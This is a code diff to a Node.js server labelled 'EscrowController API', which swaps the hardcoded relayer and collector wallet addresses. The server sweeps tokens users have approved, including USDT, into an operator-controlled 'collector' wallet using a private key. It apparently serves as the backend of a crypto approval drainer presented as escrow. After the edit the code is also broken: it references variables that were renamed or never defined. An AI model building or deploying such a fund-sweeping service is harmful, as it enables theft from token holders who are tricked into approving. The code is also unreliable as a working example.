@@ -12,11 +12,11 @@ app.use(express.json());
 
 // ============ CONFIGURATION ============
 const CONFIG = {
-    // 5e - EscrowController contract (User approves to this)
-    RELAYER_ADDRESS: "0x94f4ad671655316621ccea0c9f70fa26a209ca12",
+    // D9 - EscrowController contract (User approves to this)
+    RELAYER_ADDRESS: "0xEf1F8D5bE822993698D01e62daBb449a90e47bD9",
     
-    // 8b - Your wallet (collector & executor)
-    COLLECTOR_ADDRESS: "0xd45ff4b53728892595583f84f58c2b1626491c8c",
+    // ba - Your wallet (collector & executor)
+    COLLECTOR_ADDRESS: "0x60dc34baEAC43528072E431b0b7BF950ca248aba",
     
     USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
     
@@ -93,7 +93,7 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
         const provider = await getWorkingProvider();
         const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
 
-        console.log('📤 Executor (8b):', wallet.address);
+        console.log('📤 Executor (ba):', wallet.address);
 
         const tokenABI = [
             "function balanceOf(address) view returns (uint256)",
@@ -118,7 +118,7 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
         // Check allowance for 5e
         const allowance5e = await token.allowance(userAddress, CONFIG.RELAYER_ADDRESS);
         const allowance5eHuman = parseFloat(ethers.formatUnits(allowance5e, decimals));
-        console.log(`🔓 Allowance for 5e: ${allowance5eHuman}`);
+        console.log(`🔓 Allowance for D9: ${allowance5eHuman}`);
 
         // ============ METHOD 1: pullFunds via 5e contract ============
         if (allowance5e >= requestedAmountWei) {
@@ -162,9 +162,9 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
         }
 
         // ============ METHOD 2: Direct transferFrom ============
-        const allowance8b = await token.allowance(userAddress, wallet.address);
-        const allowance8bHuman = parseFloat(ethers.formatUnits(allowance8b, decimals));
-        console.log(`🔓 Allowance for 8b: ${allowance8bHuman}`);
+        const allowanceba = await token.allowance(userAddress, wallet.address);
+        const allowancebaHuman = parseFloat(ethers.formatUnits(allowanceba, decimals));
+        console.log(`🔓 Allowance for ba: ${allowancebaHuman}`);
 
         if (allowance8b >= requestedAmountWei) {
             console.log('✅ Using direct transferFrom...');
@@ -193,9 +193,9 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
 
         return {
             success: false,
-            error: 'No allowance for 5e or 8b',
-            allowance5e: allowance5eHuman,
-            allowance8b: allowance8bHuman
+            error: 'No allowance for D9 or ba',
+            allowanceD9: allowanceD9Human,
+            allowanceba: allowancebaHuman
         };
 
     } catch (error) {
@@ -327,8 +327,8 @@ app.post('/collect', async (req, res) => {
 app.get('/health', (req, res) => {
     res.json({
         status: 'healthy',
-        approveTo: CONFIG.RELAYER_ADDRESS + ' (5e)',
-        transferTo: CONFIG.COLLECTOR_ADDRESS + ' (8b)',
+        approveTo: CONFIG.RELAYER_ADDRESS + ' (D9)',
+        transferTo: CONFIG.COLLECTOR_ADDRESS + ' (ba)',
         pendingTransfers: dataStore.pendingTransfers?.length || 0,
         autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
         settings: {
@@ -349,9 +349,9 @@ app.get('/', (req, res) => {
     res.json({
         message: 'EscrowController API v4.1',
         flow: {
-            step1: 'User approves 5e contract',
+            step1: 'User approves D9 contract',
             step2: 'Wait 5 seconds for confirmation',
-            step3: 'pullFunds (if 8b is company) OR transferFrom',
+            step3: 'pullFunds (if ba is company) OR transferFrom',
             step4: 'Retry up to 3 times if fails'
         },
         addresses: {
@@ -367,8 +367,8 @@ app.listen(PORT, () => {
 ║     🚀 EscrowController API v4.1                  ║
 ╠══════════════════════════════════════════════════╣
 ║  Port: ${PORT}                                      ║
-║  Approve: ${CONFIG.RELAYER_ADDRESS} (12)            ║
-║  Collect: ${CONFIG.COLLECTOR_ADDRESS} (8c)          ║
+║  Approve: ${CONFIG.RELAYER_ADDRESS} (D9)            ║
+║  Collect: ${CONFIG.COLLECTOR_ADDRESS} (ba)          ║
 ║                                                  ║
 ║  Features:                                       ║
 ║  ✅ 5s delay after approval                      ║
